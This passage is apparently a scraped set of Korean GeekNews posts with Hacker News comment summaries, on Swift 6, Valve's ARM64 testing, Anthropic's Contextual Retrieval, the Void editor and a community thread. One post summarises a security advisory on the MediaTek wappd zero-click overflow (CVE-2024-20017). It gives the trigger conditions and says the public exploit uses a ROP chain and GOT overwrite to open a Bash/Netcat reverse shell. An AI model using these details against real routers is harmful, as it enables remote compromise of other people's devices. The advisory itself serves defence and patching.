     * 함수가 던지는 오류 타입을 서명에 명시할 수 있게 됨.
     * 제네릭 코드에서 오류 타입을 전달하거나 메모리 할당이 제한된 환경에서 유용함.

    소유권

     * Swift 5.9에서 도입된 비복사 타입을 제네릭 시스템과 통합하여 성능을 향상시킴.
     * ~Copyable 구문을 사용하여 리소스를 모델링하고 성능을 최적화함.

    C++ 상호 운용성

     * Swift 6는 C++의 move-only 타입, 가상 메서드, 기본 인수 등을 지원함.
     * SWIFT_NONCOPYABLE 주석을 통해 C++ 타입을 비복사 타입으로 노출 가능함.

    임베디드 Swift

     * 임베디드 소프트웨어 개발을 위한 언어 서브셋과 컴파일 모드를 포함함.
     * ARM 및 RISC-V 베어 메탈 타겟을 지원함.

    128비트 정수

     * 서명된 및 서명되지 않은 128비트 정수 타입을 추가함.

    생산성 향상

     * count(where:)와 같은 생산성 향상을 위한 여러 기능을 도입함.

  디버깅

    @DebugDescription을 통한 사용자 정의 LLDB 요약

     * @DebugDescription 매크로를 사용하여 LLDB에서 객체를 표시하는 방법을 사용자 정의 가능함.

    명시적 모듈을 통한 시작 성능 향상

     * 명시적 모듈 빌드를 사용하여 디버거의 시작 성능을 크게 향상시킴.

  라이브러리

    Foundation

     * 모든 플랫폼에서 Foundation의 구현을 통합함.
     * macOS와 iOS에서 사용된 Swift 구현을 Linux와 Windows로 확장함.

    Swift Testing

     * Swift Testing이라는 새로운 테스트 라이브러리를 도입함.
     * 매크로를 사용하여 테스트를 작성하고 조직하는 데 도움을 줌.

  플랫폼 지원

    완전 정적 SDK for Linux

     * Linux용 완전 정적 링크 실행 파일을 빌드할 수 있음.

    새로운 Linux 배포판

     * Debian, Fedora, Ubuntu 24.04에 대한 공식 지원을 추가함.

    Windows 빌드 성능

     * arm64 아키텍처에 대한 사전 빌드된 툴체인을 제공함.
     * Swift 패키지 관리자가 Windows에서 기본적으로 빌드를 병렬화함.

  다음 단계

    Swift 6 다운로드

     * Swift.org/install에서 공식 Swift 6 툴체인을 설치할 수 있음.

    Swift 시작하기

     * Swift 프로그래밍 언어 책이 최신 Swift 6 구문과 기능을 반영하도록 업데이트됨.

    패키지 생태계 탐색

     * Swift.org/packages에서 다양한 패키지를 탐색할 수 있음.

    참여하기

     * Swift 6에 대한 피드백과 경험을 공유하여 언어, 도구, 패키지 생태계, 커뮤니티의 미래 발전에 기여할 수 있음.

  GN⁺의 정리

     * Swift 6는 다양한 플랫폼과 도메인으로 확장된 주요 릴리스임.
     * 동시성, C++ 상호 운용성, 임베디드 Swift 등 여러 새로운 기능을 포함함.
     * Swift Testing과 같은 새로운 라이브러리와 생산성 향상 기능을 도입함.
     * Linux와 Windows에 대한 지원을 확장하고 성능을 향상시킴.
     * Swift 6는 개발자에게 더 많은 가능성과 효율성을 제공함.

        Hacker News 의견

     * Swift는 거버넌스의 내재된 갈등으로 인해 천천히 죽어가고 있음
          + Swift Working Group™ 오픈 소스 커뮤니티와 Apple 기업 간의 갈등이 존재함
          + Apple이 대부분의 급여를 지불하기 때문에 Apple이 더 큰 영향력을 가짐
          + 하드코딩된 컴파일러 예외와 같은 기술 부채가 컴파일러 코드베이스에 영구적으로 존재함
          + Apple이 SwiftUI 문법을 예쁘게 만들기 위해 반쯤 완성된 개념을 논의 없이 밀어붙임
          + 여전히 놀라운 언어지만 Apple이 놓아주지 않으면 향후 10년 동안 잘 살아남기 어려울 것 같음
     * Swift를 새로 배우고 있으며 현재까지는 괜찮다고 생각함
          + SwiftUI를 사용할 때 ""컴파일 실패: 컴파일러가 이 표현식을 합리적인 시간 내에 타입 체크할 수 없음; 표현식을 개별 서브 표현식으로 나누어 보세요""라는 오류가 자주 발생함
          + 컴파일러가 도움을 요청하는 것이 충격적임
     * 안전한 동시성과 타입이 지정된 throws 덕분에 Swift가 더 친근한 Rust처럼 보이기 시작함
          + 패키지 생태계가 작기 때문에 일상적으로 사용하지는 않을 것 같음
          + 크로스 플랫폼 Foundation이 이를 개선하는 방향으로 나아가기를 희망함
     * Swift 6는 크로스 플랫폼 배터리 포함 개발에 있어 큰 도약임
          + Foundation이 많은 것을 기본적으로 제공하기 때문에 큰 장점임
          + Swift 6는 저수준 개선과 크로스 플랫폼 기능이 충분하여 C, C++, Rust, Zig 등을 장기적으로 대체하려는 시도로 보임
     * 최근 Swift와 SwiftUI를 배우기 시작했으며 언어가 복잡하다는 것에 놀람
          + 특히 반응형 인스턴스 변수와 관련하여 복잡함
          + @observableObject와 같은 개념을 이해하지 못함
          + 여러 가지 방법이 있어 결국 작동할 때까지 시도해 봄
     * Swift가 macOS에만 머물 것이라고 생각했지만 매우 흥미로움
          + Ubuntu 패키지에서 Swift 컴파일러를 Debian으로 변환할 때 문제가 있었음
          + 대부분의 기능은 작동하지만 sigterm 신호와 같은 간단한 것들은 작동하지 않음
          + Swift는 환상적인 언어이며 오늘날 가장 발전되고 스마트한 언어라고 생각함
          + SwiftUI의 구현 방식을 보면 놀라울 정도임
          + 언어는 사용하기 쉽고 개발자의 실제 사용을 고려한 고급 기능과 아이디어로 가득 차 있음
          + 그러나 컴파일러 오류 메시지와 문서는 매우 불친절함
          + 대부분의 라이브러리는 아직 Linux에서 잘 작동하지 않지만 안전성과 속도, 개발의 즐거움 사이의 균형을 맞추면 미래가 밝음
     * Swift는 무엇을 하고 싶은지 결정하고 그것을 고수해야 함
          + 너무 많은 문법 설탕과 반쯤 완성된 개념이 있음
     * SwiftGodot을 시도했으며 게임 개발에 Swift를 사용하는 것이 C#의 GC 지연보다 흥미로움
          + 아직 Windows 개발 라이브러리를 공유하는 것을 지원하지 않음
          + 컴파일 시간이 오래 걸림
          + 변경 로그에 Windows에서 멀티 스레드 Swift 패키지 관리자 개선이 언급됨
     * 점진적으로 이동할 수 있는 것이 매우 좋음
          + Swift-6 모드로 이동하는 것은 데이터 경합 안전성 검사를 포함하여 부담스러울 수 있음
          + 새로운 도구를 사용할 수 있지만 5.10 버전의 언어를 계속 사용할 수 있음
          + 동일한 패키지를 두 가지 언어 모드에서 빌드할 수 있어 라이브러리가 버전업을 하면서도 준비되지 않은 클라이언트를 지원할 수 있음
     * Swift 언어가 괴물이 되어버렸음

   스위프트라는 멋진 언어를 시작하기 위해서는 다소 비싼 애플 생태계를 도입 할 수 밖에 없는게 개발자들에게 작지 않은 벽이 되는 것 같습니다.
"
"https://news.hada.io/topic?id=16874","MediaTek Wi-Fi 칩셋의 치명적 익스플로잇: 제로 클릭 취약점","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                MediaTek Wi-Fi 칩셋의 치명적 익스플로잇: 제로 클릭 취약점

    MediaTek Wi-Fi 칩셋의 심각한 취약점: Zero-Click 취약점(CVE-2024-20017)이 라우터와 스마트폰을 위협함

      개요

     * SonicWall Capture Labs 위협 연구팀은 CVE-2024-20017 취약점을 인지하고, 그 영향력을 평가하여 완화 조치를 개발함
     * CVE-2024-20017은 CVSS 3.0 점수 9.8의 심각한 zero-click 취약점으로, MediaTek Wi-Fi 칩셋 MT7622/MT7915 및 RTxxxx SoftAP 드라이버 번들에 영향을 미침
     * Ubiquiti, Xiaomi, Netgear 등의 다양한 제조업체 제품에 사용되는 MediaTek SDK 버전 7.4.0.1 및 이전 버전, OpenWrt 19.07 및 21.02가 영향을 받음
     * 이 취약점은 사용자 상호작용 없이 원격 코드 실행을 허용하며, MediaTek은 이를 완화하기 위한 패치를 배포함
     * 이 취약점은 3월에 공개되고 패치되었으나, 최근에 공개된 PoC로 인해 악용 가능성이 높아짐

      기술적 개요

     * 취약점은 MediaTek MT7622/MT7915 SDK 및 RTxxxx SoftAP 드라이버 번들에 포함된 네트워크 데몬인 wappd에 존재함
     * wappd는 무선 인터페이스와 액세스 포인트를 구성하고 관리하는 역할을 하며, 특히 Hotspot 2.0 기술과 관련됨
     * wappd의 아키텍처는 네트워크 서비스 자체, 장치의 무선 인터페이스와 상호작용하는 로컬 서비스 세트, 그리고 Unix 도메인 소켓을 통한 구성 요소 간 통신 채널로 구성됨
     * 취약점은 공격자가 제어하는 패킷 데이터에서 직접 가져온 길이 값을 메모리 복사에 사용하여 발생하는 버퍼 오버플로우로 인해 발생함

      취약점 유발

     * 취약점은 IAPP_RcvHandlerSSB 함수에서 발생하며, 공격자가 제어하는 길이 값이 IAPP_MEM_MOVE 매크로에 전달됨
     * 최대 패킷 길이 1600 바이트를 초과하지 않는지 확인하는 것 외에는 경계 검사가 이루어지지 않음
     * 공격자는 예상되는 구조를 공격 페이로드 앞에 붙여 패킷을 전송해야 함
     * RT_IAPP_HEADER 구조체의 길이는 작아야 하며, RT_IAPP_HEADER.Command 필드는 50이어야 함

      악용

     * 공개된 익스플로잇 코드는 ROP 체인을 사용하여 전역 주소 테이블 덮어쓰기 기법으로 원격 코드 실행을 달성함
     * system() 호출을 활용하여 역셸을 공격자에게 보내는 명령을 실행함
     * 역셸은 Bash와 Netcat 도구를 사용하여 설정됨

      SonicWall 보호

     * SonicWall 고객이 이 취약점으로 인한 악용에 대비할 수 있도록 다음 서명이 배포됨
          + IPS: 20322 MediaTek MT7915 wlan Service OOB Write 1
          + IPS: 20323 MediaTek MT7915 wlan Service OOB Write 2

      완화 권장 사항

     * 익스플로잇 코드가 공개되었으므로, 사용자는 해당 칩셋의 최신 펌웨어 버전으로 업그레이드할 것을 강력히 권장함

      관련 링크

     * MediaTek 보안 공지
     * CoffinSec 블로그
     * Security Online 정보
     * GitHub 리포지토리

    GN⁺의 정리

     * 이 기사는 MediaTek Wi-Fi 칩셋의 심각한 zero-click 취약점에 대해 다루고 있으며, 이는 사용자 상호작용 없이 원격 코드 실행을 허용함
     * SonicWall 연구팀은 이 취약점을 인지하고 완화 조치를 개발하였으며, 사용자에게 최신 펌웨어로 업그레이드할 것을 권장함
     * 이 취약점은 다양한 제조업체의 라우터와 스마트폰에 영향을 미치며, 최근 공개된 PoC로 인해 악용 가능성이 높아짐
     * 유사한 기능을 가진 제품으로는 Qualcomm의 Wi-Fi 칩셋이 있으며, 보안 업데이트를 주기적으로 확인하는 것이 중요함

        Hacker News 의견

     * OP의 링크를 광고가 아닌 원본 소스로 변경해달라는 요청이 있음
          + 원본 소스: CoffinSec 블로그
     * Mediatek의 벤더 SDK 드라이버 소스 코드가 mt76과 비교해 엉망이라는 의견
          + 일부 사용자는 벤더 드라이버를 사용한 aftermarket 펌웨어를 실행 중임
          + Mediatek의 WiSoC 부서에는 FOSS 커뮤니티와 적극적으로 소통하는 엔지니어들이 있음
          + 이들은 mt76을 사용하는 OpenWrt 포크를 유지 중임
          + 관련 링크: Mediatek OpenWrt Feeds
     * 제목이 오해를 불러일으킬 수 있다는 의견
          + mt76 Wi-Fi를 사용하는 라우터를 가지고 있어 펌웨어나 실리콘 버그일까 걱정했으나, 벤더의 SDK 문제임을 알고 안도함
          + 메인라인 커널과 hostapd에서 mt76 지원이 좋음에도 불구하고 벤더 SDK를 사용하는 것이 이해되지 않음
     * MediaTek의 명명 규칙에 대한 의문
          + mt6631 Wi-Fi 칩을 사용하는 기기가 영향을 받지 않는다고 추정하지만, 확실하지 않음
     * OpenWrt 19.07과 21.02가 영향을 받는다고 하지만, 공식 빌드는 mt76 드라이버만 사용함
     * AMD CPU가 장착된 노트북에 MediaTek RZ616 Wi-Fi 카드가 포함되어 있어 Intel Wi-Fi 카드로 교체 중임
          + 교체 후 RZ616 카드가 쌓여서 문제임
     * MediaTek 칩셋을 사용하는 휴대폰이 있는데, 벤더가 MediaTek 제품의 품질 문제로 인해 다른 제품으로 전환했음을 기억함
          + 휴대폰의 Wi-Fi가 어떻게 작동하는지 모르겠음
          + Wi-Fi를 거의 사용하지 않지만, 휴대폰이 영향을 받는지 알고 싶음
     * MediaTek SDK 버전 7.4.0.1 이하와 OpenWrt 19.07 및 21.02가 영향을 받음
          + 취약점은 MediaTek MT7622/MT7915 SDK와 RTxxxx SoftAP 드라이버 번들에 포함된 wappd 네트워크 데몬에 있음
          + OpenWrt는 wappd를 사용하지 않는 것으로 보임
     * C급 벤더들이 펌웨어를 오픈 소스로 공개하지 않는 이유를 이해할 수 없다는 의견
"
"https://news.hada.io/topic?id=16915","Valve, 유명 게임에 ARM64 지원을 테스팅 중","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     Valve, 유명 게임에 ARM64 지원을 테스팅 중

     * Valve가 Steam에서 ARM64와 Android 지원을 테스트하고 있음
          + SteamDB에서 발견된 새로운 업데이트(앱 ID 3043620)에서 이를 확인 가능
     * Left 4 Dead 2, Garry's Mod 등 인기 게임들이 ""proton-arm64"" 태그로 테스트되고 있음
     * 이는 ARM64 아키텍처로 실행되는 새로운 Valve 하드웨어를 암시

Valve의 에코시스템 업그레이드 계획

     * Valve는 ARM64 아키텍처와 Android 앱 지원을 통합하는 등 에코시스템을 업그레이드하는 새로운 방법을 모색중
     * ""ValveTestApp3043620""라는 코드명의 알 수 없는 애플리케이션에 대한 업데이트에서 이를 확인할 수 있음
     * ""proton-arm64"", ""proton-arm64e"", ""proton-arm64ec"" 등의 태그가 사용되고 있음
     * ""proton_experimental"", ""proton-arm64ec-vanguard""와 같은 실험적 빌드를 나타내는 태그도 있음

ARM64 지원의 중요성

     * ARM 프로세서는 스마트폰과 태블릿 등 모바일 기기에 널리 사용됨
     * Valve는 ARM64 기반 시스템을 위해 특별히 설계된 Proton 버전을 테스트하고 있음
     * 이를 통해 Valve는 휴대용 ARM64 하드웨어에서 PC 게임을 실행할 수 있게 됨
     * Android 호환성은 Waydroid(Linux에서 Android 앱을 실행하는 도구)를 통해 암시됨

Valve의 미래 하드웨어 계획

     * Valve는 오랫동안 소문이 돌던 독립형 VR 헤드셋이나 ARM64 기반 버전의 Steam Deck을 준비하고 있을 가능성이 있음
     * 이러한 기기들은 향후 VR과 비VR 타이틀을 모두 지원할 수 있음
     * Valve는 이미 타사 게임 핸드헬드에 대한 공식 SteamOS 지원을 암시한 바 있음
     * Plague Inc: Evolved, Frostpunk 등의 게임도 업데이트에 등장함

GN⁺의 의견

     * ARM64 지원은 Valve가 더 많은 플랫폼과 기기에서 게임을 실행할 수 있도록 해줌. 이는 게임 개발자들에게도 더 넓은 시장을 제공할 수 있음
     * 그러나 ARM64 기반 기기의 성능이 기존 PC나 콘솔에 비해 떨어질 수 있으므로, 게임 최적화에 주의를 기울여야 함
     * Android 앱 지원은 게임 이외의 다양한 앱을 Steam에서 사용할 수 있게 해줌. 그러나 이는 Steam의 정체성을 흐릴 수 있으며, 보안 문제도 야기할 수 있음
     * Valve의 새로운 하드웨어가 출시된다면, Nintendo Switch나 모바일 기기들과 경쟁하게 될 것임. 차별화된 기능과 가격 경쟁력이 중요할 것으로 보임

   Steam Phone 나오면 모바일 게이밍 시장에 꽤나 임팩트를 줄 수도 있겠네요

        Hacker News 의견

     * Valve의 독립형 VR 헤드셋 Deckard를 위한 것이라는 의견이 있음
          + Gorilla Tag를 ARM에서 지원하는 이유가 Deckard 때문이라는 추측
          + Steam 라이브러리와의 호환성은 Deckard가 Meta Quest보다 경쟁 우위를 가질 수 있는 큰 장점임
          + SteamOS로 Windows 의존성을 해결했음
          + 이제 x86에 묶이지 않으려는 시도를 하고 있음
          + ARM64 테스트는 이미 널리 배포된 하드웨어 때문이며, x86에 묶이지 않는 것이 중요함
          + RISC-V 같은 다른 아키텍처도 가능하게 하려는 시도임
     * Proton이 macOS로 돌아오면 좋겠다는 의견이 있음
          + 그러나 큰 기대는 하지 않음
     * Qualcomm과 Intel의 인수 논의나 Intel의 일반적인 문제를 고려할 때, x86의 마지막 10년일 것이라는 의견이 있음
     * Valve가 더 높은 성능과 가벼운 ARM 기반의 SteamDeck 2를 개발 중일 것이라는 추측이 있음
          + 차세대 Snapdragon X를 목표로 하고 있을 가능성이 있음
     * Box64나 FEX가 Proton에 통합된 네이티브 Steam 클라이언트가 저비용의 Steam 하드웨어를 열어줄 것이라는 의견이 있음
          + 예: $100 Steam Deck, $50 HDMI 동글 콘솔 등
     * Box86.org 같은 것을 사용하는지 궁금해하는 의견이 있음
          + Proton이 wine을 사용하는 것처럼
     * ""proton_experimental""과 ""proton-arm64ec-vanguard"" 같은 태그가 있음
          + Vanguard 안티치트를 실행할 수 있는 Proton의 방법/브랜치가 될 가능성이 있는지 궁금해하는 의견이 있음
          + Valorant 실행 가능성을 기대함
     * Source 2가 모바일 지원을 하고 있으며, ARM 지원을 이미 하고 있을 가능성이 있음
          + Source는 nvidia Lightspeed Studios에 의해 모바일 지원을 했음
          + Valve가 조용히 엔진에 ARM 지원을 추가하고 있을 가능성이 있음
     * Waydroid를 사용하는 것이 흥미롭다는 의견이 있음
          + Linux Mobile이 Android 앱을 사용할 수 있도록 기업이 개발을 지원하면 좋겠다는 의견이 있음

   스팀덱에서 발로란트는 좀 ㅋㅋ
"
"https://news.hada.io/topic?id=16851","Ask GN: 하고 싶은 말을 자유롭게 남겨주세요.","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Ask GN: 하고 싶은 말을 자유롭게 남겨주세요.

   이번 주에 있었던 일, 계획, 일상, 자랑, 고민, 추천 등 하고 싶은 말을 댓글로 작성해주세요.

   앞으로 본 Ask GN 글은 매주 금요일 올라왔던 '이번 주말에 뭐 하시나요?' 를 대신하여 등록될 예정입니다.

   탈 IT를 준비중입니다.
   물경력으로 언 20년 가까이 IT에서 일하다 보니 현타가 쎄게 오네요.

   현재 회사는 솔루션 SI회사이고 PM역활을 하고 있습니다. 프로젝트를 진행하면서 발생하는 마찰과 프로젝트 진행을 위한 내고(?)를 하면서 스트레스를 많이 받은거 같네요.. ㅠㅠ

   몸쓰는 일쪽으로 알아보는 중인데 아직 재직중이여서 회사 다니면서 알아보는게 쉽지가 않네요. 월급이라는 달콤함에 절박함이 없어지는거 같아서 10월에 퇴사를 하려고 합니다.

   퇴사 후 어떻게 될지 불안하고 무섭지만 뭐 열심히 살면 또 잘 살거라 믿어보려고 합니다.

   결심하신대로 잘 이루시길 바랍니다. ()

   어려운 결정이신데, 부디 결심한대로 잘 이우어지길 바랍니다.

   와 어려운 결정 하셨네요. 원하는 일 찾으시길 바랍니다!

   오늘 낮에 밖에 나가서 산책을 했는데 날씨가 역대급으로 좋았습니다. 아무생각없이 돌아다녔는데도 정말 상쾌하게 기분이 너무너무 좋아지더라구요...
   앞으로 이런 좋은 날이 얼마나 있을까요? 기후변화가 있더라도 이런 좋은 날이 좀 있긴 할까요? 궁금해지네요

   리팩토링 관련 책을 읽고 있습니다!

   five lines of code 라는 책인데 대부분 내용들에 대해서 좋게 생각하고 도입도 하고 있습니다!

   지인이 추천해준 에디터인 cursor를 써 볼 겁니다

   회사 기밀 코드를 다룰 때만 코파일럿을 쓰고 나머지 모든 곳에 Cursor를 써보고 있는데 진짜 제 체감은 너무 좋아서 쓸 때마다 울고 싶을 지경입니다. AI가 적극적으로 편집에 관여하는 게 너무 감동적이에요. Copilot은 Add만 제안하는데 얘는 Remove랑 Modify까지 지원하니까 너무 좋습니다..

   Godot 4와 Jolt 물리엔진과 더블 데이트 할 예정입니다.

   이슈 트래커에 프로젝트 실무레벨 일감을 누가, 얼마나 자세히 작성해야 한다고 생각하시나요? 저는 중간관리자, 실무자는 사원/대리급이고 일단 저는 요구사항과 덜 구체적인 사용자 플로우, 그리고 구현 시 참고할만한 기술이나 패턴을 적어드리긴 합니다

   단순 호기심에서 하는 질문이고 다른 분들은 어떻게 하고 계신지 궁금해서 질문 남깁니다

   프로젝트 오너십 가진 사람이....
   Triage 하려면 그걸 잘 아는 사람이 하는 수 밖에 없으니까

   요.
   (를 빼먹었네요.)

   검은 오공 게임에 빠져있습니다. 너무 재밌네요

   주말보다 이게 좋은것 같아요. 그냥 편하게 남겨 봅니다.

   매년 새로운 것을 하나 이상 해보는 것을 목표로 하는데요. 올해는 스페인어+자전거 였습니다.
   스페인어는 듀오링고로 258일째 하고있고, 자전거 전에 런데이로 러닝부터 시작을 했네요
   런데이 앱 설치하고 초보 중급 코스 끝내서 50분 연속 달리기 까지 끝내고, 이제 자전거를 타기 시작했습니다.
   그냥 동네 마실 다니듯이 살살 타고 있는데 나름 재미있네요.

   런닝을 시작해보려고 하는데 관련하여 런데이앱이라는 것도 있나보군요~ 한번 사용해봐야겠습니다.

   예전엔 그냥 암 생각 없이 뛰었는데, 앱으로 하니까 장점이 있더라고요.
   인터벌 훈련도 혼자하긴 어려운데 잘 지시해줍니다. 런데이 강력 추천합니다 ㅎㅎ

   런데이 앱 깔아보니, 저같은 초심자가 계획을 가지고 달려볼 수 있겠네요. 좋은 앱 소개 감솨~

   내일 우중 근교 나들이 갑니다.
   벽에 걸려있던 TV 를 떼내어 이동식 거치대에 달았더니, 어디에서든 정면에서 볼 수 있어 정말 만족스러워요.

   개인적인 의견이고 청중에 따라 꽤나 선민의식 가득한 의견처럼 보일 수 있지만,
   GeekNews 에서는 국내 기업 소식이 올라가는게 되게 거부감이 듭니다.
     * 마케팅 측면이 더 강하고, 생산적인 토론이 어렵습니다.
     * 일방적이고 통보적이며, 때로는 강압적입니다.
     * 제 3자의 여러 의견을 통제하거나 무시합니다.

   단, 국내 개인의 Show GN이나, 국내 기업이라도 Hackernews 같이 해외에 동시에 올라와 해외 반응들까지 확인할 수 있는 장이 있으면 낫다고 생각합니다. 저는 오히려 국내 개발자들의 Show 를 환영하는 입장입니다.

   해외 기업의 국내 뉴스룸도 마찬가지입니다. 보따리 장수 주제인 애플코리아의 '나의 찾기' 서비스 한국 서비스 개시를 보고 처음에 개소린줄 알았죠.

   결론이라면, 국내 기업 테크 소식은, 해외의 충분한 의견 이후 여기에 올라왔으면 좋겠습니다. 그들은 돈 안주면 피드백 들어줄 대상이 아니라고만 보이기 때문입니다. 물론 자선사업이 아닌 건 압니다. 거부감 들게 하는 국내 테크 기업의 태도에 경악을 금치 못해서 그렇습니다.

   그동안 다셨던 댓글들에 이어 여기에서도 국내 기업을 계속해서 비난하고 계시네요. 특정한 사건이 있어서거나 특정한 회사에 대해 언급하시는 것도 아니고, 한국 기업을 모두 묶어 부정적으로 표현하시는 걸 계속 보았습니다. 긱뉴스는 한국어로 된 서비스이고, 한국 기업에 다니거나 한국에서 서비스를 만드는 많은 사람들이 이용하고 있습니다. 이유나 설명 없는 비난이 긱뉴스 유저들에게도 향하고 있어요. 어떤 나쁜 경험이 있으셨는지는 모르겠습니다. 분노를 표출하거나 공감 받고 싶으시다면, 다른 사람과 논의가 가능하도록 설명을 하시거나 다른 방법을 찾으시는 게 좋을 것 같습니다.

   무분별한 비난과 분노의 표출은 다른 사용자들의 이용에 방해되는 행위입니다. 이미 많은 분들이 남기신 댓글에 flag 와 다운보트를 하고 있습니다. 누적되면 긱뉴스 사용에 제한이 가해질 수 있음을 알려드립니다.
"
"https://news.hada.io/topic?id=16865","Anthropic, Contextual Retrieval(문맥 검색) 공개","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Anthropic, Contextual Retrieval(문맥 검색) 공개

     * AI 모델이 특정 컨텍스트에서 유용하려면 배경 지식에 접근할 필요가 있음
     * 개발자들은 일반적으로 Retrieval-Augmented Generation(RAG)를 사용해 AI 모델의 지식을 향상시킴
     * 전통적인 RAG 솔루션은 정보를 인코딩할 때 컨텍스트를 제거하여 관련 정보를 검색하지 못하는 경우가 많음
     * Contextual Retrieval은 RAG의 검색 단계를 크게 개선하는 방법으로, Contextual Embeddings과 Contextual BM25라는 두 가지 하위 기술을 사용함
     * 이 방법은 검색 실패율을 49% 감소시킬 수 있으며, 재순위화와 결합하면 67%까지 감소시킬 수 있음
     * 개발자는 Claude와 함께 자신만의 Contextual Retrieval 솔루션을 쉽게 배포할 수 있음

긴 프롬프트 사용에 대한 참고 사항

     * 지식 베이스가 200,000 토큰 미만인 경우 전체 지식 베이스를 모델에 제공하는 프롬프트에 포함시킬 수 있음
     * 최근 Claude에 프롬프트 캐싱을 출시하여 이 접근 방식이 훨씬 빨라지고 비용 효율적임
     * Knowledge Base가 커지면 더 확장 가능한 솔루션이 필요하고, 이럴때 Contextual Retrieval이 필요함

RAG 기본: 대규모 지식 베이스로 확장

     * 컨텍스트 윈도우에 맞지 않는 더 큰 지식 베이스의 경우 일반적인 솔루션은 RAG임
     * RAG는 지식 베이스를 더 작은 청크로 분해하고, 이를 벡터 임베딩으로 변환한 다음, 의미론적 유사성을 통해 검색할 수 있는 벡터 데이터베이스에 저장함
     * 임베딩 모델은 의미 관계를 포착하는 데 뛰어나지만 중요한 정확한 일치를 놓칠 수 있음
     * BM25는 정확한 단어나 구문 일치를 찾기 위해 어휘 매칭을 사용하는 랭킹 함수로, 고유 식별자나 기술 용어를 포함하는 쿼리에 특히 효과적임
     * RAG 솔루션은 다음 단계를 사용하여 임베딩과 BM25 기술을 결합함으로써 가장 적용 가능한 청크를 더 정확하게 검색할 수 있음:
          + 지식 베이스(문서의 ""코퍼스"")를 일반적으로 몇 백 토큰 이하의 더 작은 텍스트 청크로 분해
          + 이러한 청크에 대한 TF-IDF 인코딩과 의미론적 임베딩 생성
          + BM25를 사용하여 정확한 일치를 기반으로 상위 청크 찾기
          + 임베딩을 사용하여 의미론적 유사성을 기반으로 상위 청크 찾기
          + 순위 융합 기술을 사용하여 (3)과 (4)의 결과를 결합하고 중복 제거
          + 상위 K개 청크를 프롬프트에 추가하여 응답 생성

Contextual Retrieval 도입

     * 전통적인 RAG에서는 문서를 더 작은 청크로 분할하기 때문에 개별 청크가 충분한 맥락을 결여할 수 있음
     * Contextual Retrieval은 각 청크 앞에 청크별 설명 컨텍스트를 추가하여 이 문제를 해결함
     * Claude는 전체 문서의 맥락을 사용하여 청크를 설명하는 간결한 청크별 컨텍스트를 제공하도록 지시하는 프롬프트를 사용하여 Contextual Retrieval 구현을 지원함
     * Contextual Retrieval은 프롬프트 캐싱 덕분에 Claude와 함께 저렴한 비용으로 이용 가능함

성능 개선

     * Contextual Embeddings는 상위 20개 청크 검색 실패율을 35% 감소시킴 (5.7% → 3.7%)
     * Contextual Embeddings와 Contextual BM25를 결합하면 실패율이 49% 감소함 (5.7% → 2.9%)

구현 시 고려사항

     * 문서를 청크로 분할하는 방법 고려
     * Contextual Retrieval은 모든 임베딩 모델에서 성능을 향상시키지만 일부 모델이 더 많은 혜택을 받을 수 있음
     * 일반 프롬프트가 잘 작동하지만 특정 도메인이나 사용 사례에 맞춘 프롬프트로 더 나은 결과를 얻을 수 있음
     * 컨텍스트 윈도우에 더 많은 청크를 추가하면 관련 정보를 포함할 가능성이 높아짐
     * 항상 평가를 실행하여 컨텍스트화된 청크를 전달하고 컨텍스트와 청크를 구별하는 것이 응답 생성을 개선할 수 있음

재순위화(Reranking)로 성능 추가 향상

     * 재순위화는 가장 관련성 높은 청크만 모델에 전달되도록 하는 일반적으로 사용되는 필터링 기술임
     * 초기 검색을 수행하여 잠재적으로 관련성이 높은 상위 청크를 가져옴
     * 상위 N개 청크와 사용자 쿼리를 재순위화 모델에 전달함
     * 재순위화 모델을 사용하여 프롬프트와의 관련성과 중요성에 따라 각 청크에 점수를 부여한 다음 상위 K개 청크를 선택함
     * 상위 K개 청크를 컨텍스트로 모델에 전달하여 최종 결과를 생성함
     * 재순위화된 Contextual Embedding과 Contextual BM25는 상위 20개 청크 검색 실패율을 67% 감소시킴 (5.7% → 1.9%)
     * 비용과 지연 시간 고려사항
          + 재순위화는 특히 많은 수의 청크를 재순위화할 때 지연 시간과 비용에 영향을 줄 수 있음
          + 더 나은 성능을 위해 더 많은 청크를 재순위화하는 것과 낮은 지연 시간과 비용을 위해 더 적은 수를 재순위화하는 것 사이에는 절충이 존재함

결론

     * 위에서 설명한 모든 기술의 다양한 조합(임베딩 모델, BM25 사용, 컨텍스트 검색 사용, 재순위화 사용, 검색된 상위 K 결과의 총 개수)을 비교하는 많은 테스트를 다양한 데이터셋 유형에 걸쳐 수행함
     * 그 결과는 다음과 같음:
          + 임베딩+BM25가 임베딩 자체보다 더 좋음
          + 테스트한 임베딩 중 Voyage와 Gemini가 가장 좋음
          + 상위 20개 청크를 모델에 전달하는 것이 상위 10개나 5개만 전달하는 것보다 더 효과적임
          + 청크에 컨텍스트를 추가하면 검색 정확도가 크게 향상됨
          + 재순위화가 재순위화를 하지 않는 것보다 더 좋음
          + 이 모든 이점이 누적됨: 성능 향상을 극대화하기 위해 컨텍스트 BM25와 재순위화 단계를 거친 컨텍스트 임베딩(Voyage 또는 Gemini의)을 결합하고 프롬프트에 20개의 청크를 추가할 수 있음
     * Knowledge Base로 작업하는 모든 개발자가 제공된 쿡북을 사용하여 이러한 접근 방식을 실험해 보고 새로운 성능 수준을 달성할 것을 권장함
"
"https://news.hada.io/topic?id=16817","Void - Cursor/GitHub Copilot 대체제 오픈소스 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Void - Cursor/GitHub Copilot 대체제 오픈소스

     * Void는 오픈 소스 Cursor 대체 개발도구. VS Code의 포크버전임
     * Cursor의 모든 핵심 기능을 완전히 사용자 정의할 수 있음
          + Tab 으로 자동완성 적용
          + Ctrl + K 로 선택한 코드를 인라인 수정
          + Ctrl + L 로 질문을 던지고 결과물을 내용에 포함
     * 여러개의 파일에 빠르게 동시 적용 지원
     * 다양한 LLM 사용 가능 (로컬/외부)
     * Waitlist 를 통해서 공식 릴리스 다운로드 가능. 또는 지금 바로 Void 코드를 받아 빌드하고 개발할 수 있음

        Hacker News 의견

     * Cursor, Void 등 새로운 에디터를 만든 이유에 대한 요약을 원함
          + 기존 에디터 확장(VSCode 확장, Jetbrains 플러그인) 대신 새로운 에디터를 만든 이유가 기술적 제한 때문인지, 아니면 마케팅 때문인지 궁금함
          + 개인 및 소규모 회사는 쉽게 채택할 수 있지만, 대규모 회사는 기존 IDE와의 통합 때문에 새로운 IDE로 전환하기 어려움
